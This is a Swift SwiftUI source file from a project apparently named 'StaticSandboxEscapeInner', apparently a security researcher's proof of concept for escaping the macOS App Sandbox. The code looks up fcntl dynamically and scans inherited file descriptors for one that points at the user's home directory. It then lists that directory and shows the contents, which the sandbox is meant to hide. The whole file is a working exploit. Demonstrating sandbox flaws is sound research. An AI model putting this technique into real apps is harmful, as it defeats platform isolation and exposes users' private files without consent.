//
//  ContentView.swift
//  StaticSandboxEscapeInner
//
//  Created by Saagar Jha on 3/20/20.
//  Copyright © 2020 Saagar Jha. All rights reserved.
//

import SwiftUI

struct ContentView: View {
    var body: some View {
		VStack(alignment: .leading, spacing: 0) {
			Text("Here's the contents of your home directory: ")
				.padding()
			List(content(), id: \.self) {
				Text($0)
			}
		}
    }
	
	func content() -> [String] {
		let fcntl  = unsafeBitCast(dlsym(dlopen(nil, RTLD_LAZY | RTLD_NOLOAD), "fcntl"), to: (@convention(c) (CInt, CInt, UnsafePointer<CChar>) -> CInt).self)
		var limit = rlimit()
		getrlimit(RLIMIT_NOFILE, &limit)
		let fd = (0..<limit.rlim_max).first { fd in
			String(cString: [CChar](unsafeUninitializedCapacity: Int(PATH_MAX)) {
				_ = fcntl(CInt(fd), F_GETPATH, $0.baseAddress!)
				$1 = strlen($0.baseAddress!)
			}) == String(cString: getpwuid(getuid())!.pointee.pw_dir)
		}!
		let dir = fdopendir(Int32(fd))
		var files = [String]()
		while let entry = readdir(dir) {
			files.append(withUnsafePointer(to: &entry.pointee.d_name) {
				$0.withMemoryRebound(to: CChar.self, capacity: Int(entry.pointee.d_namlen)) {
					String(cString: $0)
				}
			})
		}
		return files
	}
}


struct ContentView_Previews: PreviewProvider {
    static var previews: some View {
        ContentView()
    }
}
